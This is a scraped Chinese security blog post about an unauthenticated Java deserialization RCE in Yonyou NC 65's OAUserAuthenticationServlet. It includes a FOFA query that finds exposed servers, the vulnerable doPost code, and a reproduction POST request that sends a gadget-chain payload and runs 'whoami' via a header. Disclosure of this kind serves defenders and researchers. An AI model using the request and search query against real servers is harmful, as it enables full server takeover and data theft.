---
title: "用友NC OAUserAuthenticationServlet 反序列化代码执行RCE漏洞"
source: https://mrxn.net/jswz/yonyou-nc-OAUserAuthenticationServlet-rce.html
asset_dir: assets/用友nc-oauserauthenticationservlet-反序列化代码执行rce漏洞
---

# 用友NC OAUserAuthenticationServlet 反序列化代码执行RCE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/10 08:29
* 1014浏览
* [0评论](#comment)
* 13分钟阅读

深入探索

鉴权

身份验证

计算机安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用公司推出的一款企业管理软件，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC的`OAUserAuthenticationServlet`组件存在反序列化漏洞。该Servlet在处理用户请求时，可能对接收到的序列化数据（如Java的`ObjectInputStream`）未进行安全检查，直接进行反序列化操作。攻击者可以构造恶意的序列化对象，其中包含可执行的代码，当`OAUserAuthenticationServlet`反序列化该恶意对象时，就会触发[代码执行](https://mrxn.net/tag/rce)。该漏洞可能允许攻击者在服务器上执行任意代码，从而完全控制服务器，窃取敏感数据，篡改系统配置，或进行其他恶意活动，对企业的业务系统和数据安全构成严重威胁。

漏洞扫描服务

# 影响版本

NC 65

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

## 反序列化

直接看下`OAUserAuthenticationServlet`的实现

```
public class OAUserAuthenticationServlet extends HttpServlet {
    private static final long serialVersionUID = -5847889958965745395L;

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        ObjectInputStream in = new ObjectInputStream(request.getInputStream());
        HashMap<Object, Object> headInfo = new HashMap();

        try {
            headInfo = (HashMap)in.readObject();
```

深入探索

安全研究报告

SQL注入检测工具

在线安全工具

由于代码在处理 HTTP 请求时，直接对用户传入的输入流进行 Java 反序列化操作（**`in.readObject()`**），且该操作发生在任何身份验证或安全检查之前，造成了未经身份验证的**远程代码执行（[RCE](https://mrxn.net/tag/rce)）漏洞**。攻击者可以构造恶意的序列化数据流，在服务器反序列化时执行任意代码。

物流软件安全

# 漏洞复现

```
POST /servlet/OAUserAuthenticationServlet?pageId=login HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-java-serialized-object
X-Authorization: whoami

{{file(/tmp/javachains.ser)}}
```

使用`Java Chains` 的`TransformerWithDefiningClassLoader2`构造**绕黑名单**进行命令执行回显

[![用友NC OAUserAuthenticationServlet 反序列化代码执行RCE漏洞](images/img-001-b57541fc0e74.webp)](https://image.mrxn.net/9f4fd82858d74bb49e1dc0bdab7ecf70.webp)

成功执行命令并回显执行结果

安全工具开发

[![用友NC OAUserAuthenticationServlet 反序列化代码执行RCE漏洞](images/img-002-29f9244df0de.webp)](https://image.mrxn.net/e84d0cb9d42647b29c388f4ad946e6bb.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.反序列化](#toc-4-1-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC OAUserAuthenticationServlet 反序列化代码执行RCE漏洞](https://mrxn.net/jswz/yonyou-nc-OAUserAuthenticationServlet-rce.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc-OAUserAuthenticationServlet-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞扫描服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-OAUserAuthenticationServlet-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

